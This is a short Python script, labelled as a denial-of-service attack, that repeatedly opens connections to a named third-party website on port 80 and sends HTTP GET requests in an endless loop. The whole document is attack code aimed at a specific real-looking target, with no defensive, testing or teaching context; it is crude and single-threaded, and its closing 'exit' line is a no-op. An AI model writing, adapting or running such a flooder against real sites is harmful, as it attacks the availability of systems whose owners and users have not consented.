import socket

target = 'www.barrierbreak.com'
port = 80

def dos_attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    request = 'GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: My User Agent/1.0\r\n\r\n'.format(target)
    s.sendall(request.encode('ascii'))
    response = s.recv(1024)
    s.close()
    print(response.decode('ascii'))

try:
    while True:
        dos_attack()
except KeyboardInterrupt:
    exit